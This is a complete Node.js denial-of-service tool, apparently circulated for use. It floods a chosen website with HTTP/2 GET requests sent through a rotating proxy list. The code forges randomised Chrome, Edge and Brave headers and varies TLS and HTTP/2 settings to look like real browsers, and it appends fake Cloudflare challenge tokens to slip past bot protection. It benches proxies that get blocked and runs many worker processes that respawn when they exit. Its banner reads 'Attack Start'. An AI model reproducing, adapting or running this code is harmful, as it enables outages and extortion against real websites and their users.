const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');

const ignoreNames = ['RequestError', 'StatusError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => 1)
    .on("SIGCHILD", () => 1);

const statusesQ = [];
let statuses = {};
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
let proxyIndex = 0;
const blockedProxies = new Map();

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
let proxy = shuffle(fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(line => line.trim() !== ''));

const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 1;
const debugMode = process.argv.includes('--debug');

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error(`
    Options:
      --query 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?rand 3 - ?q
      --delay <1-1000> - delay between requests 1-100 ms (optimal) default 1 ms
      --debug - show status code

    How To Run: 
        node ${process.argv[1]} <GET> <target> <time> <threads> <ratelimit> <proxy>

    example: 
        node ${process.argv[1]} GET "https://example.com?q=%RAND%" 120 16 90 proxy.txt --query 1 --delay 1 --debug
    `);
    process.exit(1);
}

const url = new URL(target);

function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

function getNextProxy() {
    if (proxyIndex >= proxy.length) {
        proxy = shuffle([...proxy]);
        proxyIndex = 0;
    }
    const [proxyHost, proxyPort] = proxy[proxyIndex].split(':');
    const proxyKey = `${proxyHost}:${proxyPort}`;
    const now = Date.now();

    if (blockedProxies.has(proxyKey) && blockedProxies.get(proxyKey) <= now) {
        blockedProxies.delete(proxyKey);
    }

    if (blockedProxies.has(proxyKey)) {
        proxyIndex = (proxyIndex + 1) % proxy.length;
        return getNextProxy();
    }

    proxyIndex = (proxyIndex + 1) % proxy.length;
    return [proxyHost, proxyPort];
}

if (!['GET'].includes(reqmethod)) {
    console.error('Error request method only can GET');
    process.exit(1);
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId & 0x7FFFFFFF, 5);
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload]);
    return frame;
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5) & 0x7FFFFFFF;
    const offset = flags & 0x20 ? 5 : 0;

    let payload = Buffer.alloc(0);
    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
        if (payload.length + offset !== length) {
            return null;
        }
    }

    return { streamId, length, type, flags, payload };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function encodePing(opaqueData = Buffer.alloc(8)) {
    return encodeFrame(0, 6, opaqueData, 0);
}

function encodePriority(streamId, exclusive, depStreamId, weight) {
    const data = Buffer.alloc(5);
    data.writeUInt32BE((exclusive ? 0x80000000 : 0) | (depStreamId & 0x7FFFFFFF), 0);
    data.writeUInt8(weight, 4);
    return encodeFrame(streamId, 2, data, 0);
}

function encodeWindowUpdate(streamId, increment) {
    const data = Buffer.alloc(4);
    data.writeUInt32BE(increment & 0x7FFFFFFF, 0);
    return encodeFrame(streamId, 8, data, 0);
}

function safeEncode(str) {
    return encodeURIComponent(str).replace(/'/g, "%27").replace(/"/g, "%22");
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = safeEncode(randstr(6)) + "&" + safeEncode(randstr(6));
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function generateBrowserHeaders() {
    const browsers = [
        { name: 'Google Chrome', brand: 'Google Chrome' },
        { name: 'Microsoft Edge', brand: 'Microsoft Edge' },
        { name: 'Brave', brand: 'Brave' }
    ];
    const browser = browsers[Math.floor(Math.random() * browsers.length)];
    const version = getRandomInt(123, 137);
    const fullVersion = `${version}.0.${getRandomInt(0, 9999)}.${getRandomInt(0, 99)}`;

    let headersToReturn = {};
    const platforms = ['Windows', 'Macintosh', 'Linux'];
    const platform = platforms[Math.floor(Math.random() * platforms.length)];
    const acceptLanguages = [
        'en-US,en;q=0.9',
        'en-GB,en;q=0.8,fr;q=0.7',
        'fr-FR,fr;q=0.9,en;q=0.8',
        'es-ES,es;q=0.9,en;q=0.8'
    ];
    headersToReturn.acceptLanguage = acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)];

    let uaPlatformString = '';
    let platformVersion = '';
    let arch = '"x86"';
    let bitness = '"64"';

    switch (platform) {
        case 'Windows':
            uaPlatformString = 'Windows NT 10.0; Win64; x64';
            platformVersion = '"10.0.0"';
            break;
        case 'Macintosh':
            uaPlatformString = 'Macintosh; Intel Mac OS X 10_15_7';
            platformVersion = '"14.5.0"';
            arch = Math.random() > 0.5 ? '"arm"' : '"x86"';
            break;
        case 'Linux':
            uaPlatformString = 'X11; Linux x86_64';
            platformVersion = '"6.6.15"';
            break;
    }

    headersToReturn.userAgent = `Mozilla/5.0 (${uaPlatformString}) AppleWebKit/537.36 (KHTML, like Gecko) ${browser.name === 'Microsoft Edge' ? 'Edg' : 'Chrome'}/${fullVersion} Safari/537.36${browser.name === 'Microsoft Edge' ? ` Edg/${fullVersion}` : browser.name === 'Brave' ? ` Brave/${fullVersion}` : ''}`;
    headersToReturn.acceptHeaderValue = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
    headersToReturn.secChUa = `"Not A;Brand";v="24", "Chromium";v="${version}", "${browser.brand}";v="${version}"`;
    headersToReturn.secChUaFullVersionList = `"Not A;Brand";v="24.0.0.0", "Chromium";v="${fullVersion}", "${browser.brand}";v="${fullVersion}"`;
    headersToReturn.secChUaMobile = Math.random() > 0.9 ? '?1' : '?0';
    headersToReturn.secChUaPlatform = `"${platform}"`;
    headersToReturn.secChUaArch = arch;
    headersToReturn.secChUaBitness = bitness;
    headersToReturn.secChUaFullVersion = `"${fullVersion}"`;
    headersToReturn.secChUaPlatformVersion = platformVersion;
    headersToReturn.secChUaModel = '""';
    headersToReturn.secFetchDest = 'document';
    headersToReturn.secFetchMode = 'navigate';
    headersToReturn.secFetchSite = Math.random() > 0.5 ? 'same-origin' : 'cross-site';
    headersToReturn.upgradeInsecureRequests = '1';
    headersToReturn.referer = getRandomReferer();

    return headersToReturn;
}

function handleQuery(query) {
    let path = url.pathname;
    const randValue = safeEncode(randstr(8));
    if (query === '1') {
        return `${path}?cf__chl_tk=${randValue}-${timestampString}.${randstr(4)}`;
    } else if (query === '2') {
        return `${path}?rand=${randValue}`;
    } else if (query === '3') {
        return `${path}?q=${randValue}`;
    }
    return path;
}

function getRandomReferer() {
    const referers = [
        'https://www.google.com',
        'https://www.bing.com',
        `${url.protocol}//${url.hostname}`,
        'https://t.co/',
        'https://duckduckgo.com'
    ];
    return referers[Math.floor(Math.random() * referers.length)];
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function go() {
    const [proxyHost, proxyPort] = getNextProxy();
    let tlsSocket;
    let windowSize = getRandomInt(32768, 65535); // Random initial window size

    if (!proxyPort || isNaN(proxyPort)) {
        setTimeout(go, 100);
        return;
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: ['h2'],
                servername: url.hostname,
                rejectUnauthorized: false,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                ciphers: [
                    "TLS_AES_128_GCM_SHA256",
                    "TLS_AES_256_GCM_SHA384",
                    "TLS_CHACHA20_POLY1305_SHA256",
                    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
                    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
                    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
                    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
                    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
                    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256"
                ].join(':'),
                sigalgs: [
                    "ecdsa_secp256r1_sha256",
                    "rsa_pss_rsae_sha256",
                    "rsa_pkcs1_sha256",
                    "ecdsa_secp384r1_sha384",
                    "rsa_pss_rsae_sha384",
                    "rsa_pkcs1_sha384"
                ].join(':'),
                ecdhCurve: [
                    "X25519",
                    "prime256v1",
                    "secp384r1"
                ].join(':')
            }, () => {
                let streamId = getRandomInt(1, 1000) * 2 + 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(4096);

                const settingsPayload = encodeSettings([
                    [1, 4096],
                    [2, Math.random() > 0.7 ? 1 : 0], // More conservative push enable
                    [4, windowSize],
                    [6, getRandomInt(8192, 16384)]
                ]);

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, settingsPayload),
                    encodeWindowUpdate(0, windowSize)
                ];

                setTimeout(() => {
                    if (!tlsSocket.destroyed) {
                        tlsSocket.write(encodeFrame(0, 4, Buffer.alloc(0), 0x1));
                    }
                }, getRandomInt(20, 80));

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);
                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type === 4 && frame.flags === 0) {
                                if (Math.random() > 0.05) {
                                    tlsSocket.write(encodeFrame(0, 4, "", 1));
                                }
                            }
                            if (frame.type === 1 && debugMode) {
                                const status = hpack.decode(frame.payload).find(x => x[0] === ':status')?.[1];
                                if (status) {
                                    statuses[status] = (statuses[status] || 0) + 1;
                                    if (status === '429' || status === '403' || status === '401') {
                                        const proxyKey = `${proxyHost}:${proxyPort}`;
                                        blockedProxies.set(proxyKey, Date.now() + 60000);
                                        if (debugMode) {
                                            console.log(`[DEBUG] Proxy ${proxyKey} hit ${status}, blocked for 60s`);
                                        }
                                        tlsSocket.end(() => tlsSocket.destroy());
                                    }
                                }
                            }
                            if (frame.type === 7 || frame.type === 5) {
                                if (frame.type === 7 && debugMode) {
                                    statuses["GOAWAY"] = (statuses["GOAWAY"] || 0) + 1;
                                }
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                            if (frame.type === 8 && frame.streamId === 0) {
                                windowSize += frame.payload.readUInt32BE(0);
                            }
                        } else {
                            break;
                        }
                    }
                });

                tlsSocket.write(Buffer.concat(frames));

                if (Math.random() > 0.5) {
                    setTimeout(() => {
                        if (!tlsSocket.destroyed) {
                            tlsSocket.write(encodePing(Buffer.alloc(8).fill(Math.random() * 255)));
                        }
                    }, getRandomInt(200, 600));
                }

                setTimeout(doWrite, getRandomInt(50, 150));

                const browserHeaders = generateBrowserHeaders();

                function doWrite() {
                    if (tlsSocket.destroyed) {
                        return;
                    }

                    const path = query ? handleQuery(query) : url.pathname;

                    const headers = [
                        [":method", reqmethod],
                        [":authority", url.hostname],
                        [":scheme", "https"],
                        [":path", path],
                        ["accept", browserHeaders.acceptHeaderValue],
                        ["accept-encoding", "gzip, deflate, br"],
                        ["accept-language", browserHeaders.acceptLanguage],
                        ["user-agent", browserHeaders.userAgent],
                        ["sec-ch-ua", browserHeaders.secChUa],
                        ["sec-ch-ua-mobile", browserHeaders.secChUaMobile],
                        ["sec-ch-ua-platform", browserHeaders.secChUaPlatform],
                        ["sec-ch-ua-arch", browserHeaders.secChUaArch],
                        ["sec-ch-ua-bitness", browserHeaders.secChUaBitness],
                        ["sec-ch-ua-full-version", browserHeaders.secChUaFullVersion],
                        ["sec-ch-ua-platform-version", browserHeaders.secChUaPlatformVersion],
                        ["sec-ch-ua-model", browserHeaders.secChUaModel],
                        ["sec-fetch-dest", browserHeaders.secFetchDest],
                        ["sec-fetch-mode", browserHeaders.secFetchMode],
                        ["sec-fetch-site", browserHeaders.secFetchSite],
                        ["upgrade-insecure-requests", browserHeaders.upgradeInsecureRequests],
                        ["referer", browserHeaders.referer]
                    ];

                    const packed = Buffer.concat([Buffer.from([0x80, 0, 0, 0, 0xFF]), hpack.encode(shuffle(headers))]);
                    const requestFrame = encodeFrame(streamId, 1, packed, 0x25);

                    const requests = [];
                    if (Math.random() > 0.5) {
                        requests.push(encodePriority(streamId, Math.random() > 0.9, 0, getRandomInt(1, 255)));
                    }
                    requests.push(requestFrame);

                    if (Math.random() > 0.6 && windowSize > 16384) {
                        const increment = getRandomInt(8192, windowSize - 16384);
                        windowSize -= increment;
                        requests.push(encodeWindowUpdate(streamId, increment));
                    }

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (!err) {
                            setTimeout(doWrite, getRandomInt(800, 1200) / parseInt(ratelimit));
                        }
                    });

                    streamId += getRandomInt(2, 10) * 2;
                }
            }).on('error', () => {
                tlsSocket.destroy();
            });
        });

        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    }).once('error', () => {
        if (tlsSocket) {
            tlsSocket.end(() => tlsSocket.destroy());
        }
        setTimeout(go, 100);
    }).once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => tlsSocket.destroy());
            setTimeout(go, 100);
        }
    });
}

if (cluster.isMaster) {
    const workers = {};

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`Attack Start / @BuferOverFlow Server`);
    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message];
    });

    if (debugMode) {
        setInterval(() => {
            let statuses = {};
            for (let w in workers) {
                if (workers[w][0].state === 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            statuses[code] = (statuses[code] || 0) + st[code];
                        }
                    }
                }
            }
            console.clear();
            console.log(new Date().toLocaleString('en-US'), statuses);
        }, 1000);
    }

    setTimeout(() => process.exit(1), time * 1000);
} else {
    let conns = 0;

    let i = setInterval(() => {
        if (conns < 1000) {
            conns++;
            go();
        } else {
            clearInterval(i);
        }
    }, getRandomInt(1, delay));

    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4) {
                statusesQ.shift();
            }
            statusesQ.push(statuses);
            statuses = {};
            process.send(statusesQ);
        }, 250);
    }

    setTimeout(() => process.exit(1), time * 1000);
}